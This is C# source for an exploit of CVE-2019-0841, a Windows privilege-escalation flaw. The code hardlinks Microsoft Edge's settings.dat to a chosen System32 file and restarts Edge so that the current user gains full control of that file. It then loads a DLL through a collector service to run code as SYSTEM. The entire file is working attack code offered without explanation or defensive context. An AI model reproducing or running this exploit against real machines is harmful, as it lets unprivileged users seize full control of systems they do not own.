using System;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Security.Principal;
using System.Security.AccessControl;
using NtApiDotNet;

namespace CVE_2019_0841
{
    public class Program
    {

        public static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine(" [x] Must specify filename");
                return;
            }

            string filename = args[0];
            string path = $@"C:\Windows\System32\{filename}";

            Console.WriteLine(@" [>] Checking {0}", path);

            // check file exists
            if (!File.Exists(path))
            {
                Console.WriteLine(" [x] File does not exist");
                return;
            }

            // check target file permission
            bool fc = false;
            FileSecurity acl = CheckFilePermission(path);

            foreach (FileSystemAccessRule rule in acl.GetAccessRules(true, true, typeof(NTAccount)))
            {
                if (rule.IdentityReference.Value.Equals(@"NT AUTHORITY\SYSTEM") & rule.FileSystemRights.Equals(FileSystemRights.FullControl))
                    fc = true;
            }

            if (!fc)
            {
                Console.WriteLine(@" [x] NT AUTHORTIY\SYSTEM does not have Full Control over target file");
                return;
            }
            else
            {
                Console.WriteLine(@" [>] NT AUTHORITY\SYSTEM has Full Control");
            }

            // kill edge if open            
            KillEdge();

            // create hardlink
            string settings = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\Settings\settings.dat";
            Console.WriteLine(@" [>] Creating hardlink");

            NtFile ntFile;
            ntFile = NtFile.Open($@"\??\{path}", null, FileAccessRights.MaximumAllowed);
            ntFile.CreateHardlink($@"\??\{settings}");
            Thread.Sleep(3000);

            // start edge
            Console.WriteLine(@" [>] Starting Edge...");
            ProcessStartInfo proc = new ProcessStartInfo();
            proc.FileName = @"C:\Windows\System32\cmd.exe";
            proc.Arguments = @"/c start microsoft-edge:";
            proc.WindowStyle = ProcessWindowStyle.Hidden;
            Process.Start(proc);
            Thread.Sleep(3000);

            // kill edge
            Console.WriteLine(@" [>] Killing Edge again...");
            KillEdge();

            // check file permission again
            fc = false;
            acl = CheckFilePermission(path);

            WindowsPrincipal self = new WindowsPrincipal(WindowsIdentity.GetCurrent());
            string user = self.Identity.Name;

            foreach (FileSystemAccessRule rule in acl.GetAccessRules(true, true, typeof(NTAccount)))
            {
                if (rule.IdentityReference.Value.Equals(user) & rule.FileSystemRights.Equals(FileSystemRights.FullControl))
                    fc = true;
            }

            if (!fc)
            {
                Console.WriteLine(@" [x] {0} does not have Full Control over target file :(", user);
                return;
            }
            else
            {
                Console.WriteLine(@" [!] {0} has Full Control", user);
            }

            ntFile.Close();
            Thread.Sleep(3000);

            // collector service magic
            SystemCollector.DLL.Load(filename);

        }

        private static FileSecurity CheckFilePermission(string path)
        {
            FileInfo file = new FileInfo(path);
            FileSecurity acl = file.GetAccessControl();

            return acl;
        }

        private static void KillEdge()
        {
            Process[] edge = Process.GetProcessesByName(@"MicrosoftEdge");

            foreach (Process proc in edge)
            {
                try { proc.Kill(); } catch { }

            }
        }

    }
}
